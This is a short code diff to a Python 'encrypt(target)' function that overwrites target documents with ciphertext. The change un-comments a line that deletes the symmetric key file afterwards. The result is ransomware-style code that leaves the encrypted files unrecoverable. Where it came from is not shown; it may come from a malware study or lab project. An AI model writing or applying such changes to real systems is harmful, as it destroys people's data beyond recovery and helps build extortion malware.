@@ -150,7 +150,7 @@ def encrypt(target):
             with open(doc, "wb") as encrypted_file:
                 encrypted_file.write(cipher)
         
-        # os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
+        os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
     else:
         print("Target empty.")
 
